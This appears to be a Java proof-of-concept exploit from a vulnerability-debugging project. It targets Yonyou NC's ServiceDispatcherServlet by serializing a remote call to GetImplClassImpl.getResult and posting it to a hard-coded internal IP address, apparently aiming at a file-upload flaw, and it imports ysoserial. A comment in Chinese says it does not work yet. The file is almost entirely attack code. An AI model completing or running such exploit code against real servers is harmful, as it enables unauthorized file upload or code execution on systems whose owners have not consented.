package cve.nc;

import bsh.BshClassManager;
import bsh.NameSpace;
import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.NetObjectInputStream;
import nc.bs.framework.comn.NetObjectOutputStream;
import nc.impl.pubapp.pub.remoteservice.GetImplClassImpl;
import nc.bs.framework.comn.serv.CommonServletDispatcher;
import nc.vo.pubapp.remoteservice.RemoteTransParamsVO;
import org.mozilla.javascript.Interpreter;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;


public class GetImplClassImpl_fileupload {

    public static InvocationInfo makeInvocationInfo() throws Exception {
        String module = "pubapp";
        String serviceName = "nc.impl.pubapp.pub.remoteservice.GetImplClassImpl";
        String methodName = "getResult";
        Class[] parameterTypes = {RemoteTransParamsVO.class};
        RemoteTransParamsVO remoteTransParamsVO = new RemoteTransParamsVO();
        Object[] parameters = {remoteTransParamsVO};

        InvocationInfo invocationInfo = new InvocationInfo(module, serviceName, methodName, parameterTypes, parameters);

        InvocationInfo invocationInfo1 = new InvocationInfo();
        return invocationInfo;
    }
    // TODO 尚未成功，待完善
    public static void main(String[] args) throws Exception {

        String url = "http://10.58.120.201/ServiceDispatcherServlet/xxx";

        InvocationInfo invocationInfo = makeInvocationInfo();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ByteArrayOutputStream temp = NetObjectOutputStream.convertObjectToBytes(invocationInfo, true, true);
        System.out.println(temp.toByteArray().length);
        NetObjectOutputStream.writeInt(bos,temp.toByteArray().length);
        temp.writeTo(bos);


        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("serverEnable","localserver");
        httpRequest.sendByteArrayPost(httpPost, bos.toByteArray());
//        InvocationInfo invocationInfo = makeInvocationInfo();
//        ByteArrayOutputStream bos = NetObjectOutputStream.convertObjectToBytes(invocationInfo, true, true);
////
//        NetObjectInputStream nois = new NetObjectInputStream(new ByteArrayInputStream(bos.toByteArray()));
//        InvocationInfo o = (InvocationInfo)nois.readObject();
//        String module = o.getModule();
//        System.out.println(module);


    }
}
